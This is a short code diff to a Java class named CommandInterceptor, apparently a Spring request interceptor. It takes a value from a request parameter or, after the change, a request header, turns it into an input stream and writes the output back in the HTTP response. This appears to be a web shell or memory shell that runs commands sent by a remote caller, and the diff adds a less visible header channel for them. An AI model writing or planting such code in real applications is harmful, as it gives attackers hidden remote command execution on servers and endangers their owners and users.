@@ -18,8 +18,12 @@ public class CommandInterceptor implements AsyncHandlerInterceptor {
     @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         try {
-            String param = getParam(request.getParameter(paramName));
-            if (param != null) {
+            String p = request.getParameter(paramName);
+            if (p == null || p.isEmpty()) {
+                p = request.getHeader(paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                 return false;
